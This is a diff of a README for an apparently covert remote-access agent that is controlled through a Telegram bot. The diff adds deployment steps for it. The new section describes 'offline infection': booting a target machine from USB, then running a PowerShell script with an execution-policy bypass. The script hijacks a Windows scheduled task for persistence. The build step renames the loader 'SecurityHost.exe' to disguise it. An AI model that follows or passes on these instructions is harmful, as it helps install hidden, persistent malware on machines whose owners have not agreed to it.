@@ -32,16 +32,22 @@ Before you go thinking you've found the next APT tool, please keep the following
 
 ---
 
-## 🚀 How to Build (If you're feeling brave)
+## 🚀 How to Build & Deploy
 
-1.  **Configure your Bot:**
-    *   Edit `MidnightAgent/Core/Config.cs` with your Telegram Bot Token and User ID.
-2.  **Run the Magic Script:**
-    *   Just run `build_all.bat`. It will compile the C# DLL, then the Rust Loader, and bundle them together into one glorious `SecurityHost.exe`.
-3.  **Deploy:**
-    *   Take the file from `MidnightLoader/target/release/midnight_loader.exe` (or rename it to `SecurityHost.exe`).
-    *   Run as Admin.
-    *   Pray to the God of Stealth.
+### Standard Deployment
+1.  **Configure your Bot:** Edit `MidnightAgent/Core/Config.cs`.
+2.  **Run:** `build_all.bat`.
+3.  **Deploy:** Take `midnight_loader.exe` and run as Admin.
+
+### 🛠 WinPE Offline Infection (HBCD PE)
+1.  **Prepare USB:** Copy `midnight_loader.exe` and `winpe_injector.ps1` to your USB root.
+2.  **Boot:** Boot the target machine via USB (HBCD PE).
+3.  **Execute:** Open PowerShell and run:
+    ```powershell
+    cd X:\  # (Where X is your USB drive)
+    powershell.exe -ExecutionPolicy Bypass -File winpe_injector.ps1
+    ```
+4.  **Result:** The script will hijack the `Consolidator` task. Unplug USB and reboot.
 
 ---
 
